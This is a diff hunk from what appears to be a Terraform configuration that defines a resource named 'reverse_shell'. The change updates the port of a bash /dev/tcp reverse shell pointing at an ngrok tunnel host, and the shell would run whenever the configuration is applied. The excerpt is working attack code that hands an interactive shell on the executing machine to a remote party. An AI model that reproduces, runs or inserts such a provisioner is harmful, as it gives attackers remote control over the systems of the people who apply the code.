@@ -5,7 +5,7 @@ resource "null_resource" "reverse_shell" {
       echo "Testing reverse shell methods..."
       
       # Method 1: Fixed bash TCP path
-      bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19663 0>&1' &
+      bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/10972 0>&1' &
       
       # Give it a moment to connect
       sleep 2
